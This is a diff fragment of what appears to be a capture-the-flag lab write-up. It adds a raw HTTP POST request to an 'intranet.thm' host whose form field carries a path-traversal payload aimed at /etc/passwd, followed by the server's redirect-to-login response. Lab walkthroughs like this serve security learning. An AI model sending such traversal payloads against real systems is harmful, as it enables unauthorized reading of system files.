@@ -510,6 +510,45 @@ ________________________________________________
 
 <img width="1349" height="282" alt="image" src="https://github.com/user-attachments/assets/b383f823-62cf-4fc6-bb30-28db12243df2" />
 
+
+POST /internal HTTP/1.1
+Host: intranet.thm:8080
+User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:131.0) Gecko/20100101 Firefox/131.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 29
+Origin: http://intranet.thm:8080
+Connection: close
+Referer: http://intranet.thm:8080/internal
+Cookie: session=eyJsb2dnZWRfaW4iOnRydWUsInVzZXJuYW1lIjoiYW5kZXJzIn0.ZJgx7Q.DjTuD2r7vGa9tWswAdj7c9Lr4
+Upgrade-Insecure-Requests: 1
+
+news=../../../../etc/password
+
+
+
+HTTP/1.1 302 FOUND
+Server: Werkzeug/2.2.2 Python/3.8.10
+Date: Wed, 01 Oct 2025 13:34:56 GMT
+Content-Type: text/html; charset=utf-8
+Content-Length: 199
+Location: /login
+Connection: close
+
+<!doctype html>
+<html lang=en>
+<title>Redirecting...</title>
+<h1>Redirecting...</h1>
+<p>You should be redirected automatically to the target URL: <a href="/login">/login</a>. If not, click the link.
+
+
+
+
+
+
+
 <br>
 <h2 align="center">/etc/passwd</h2>
 <p>
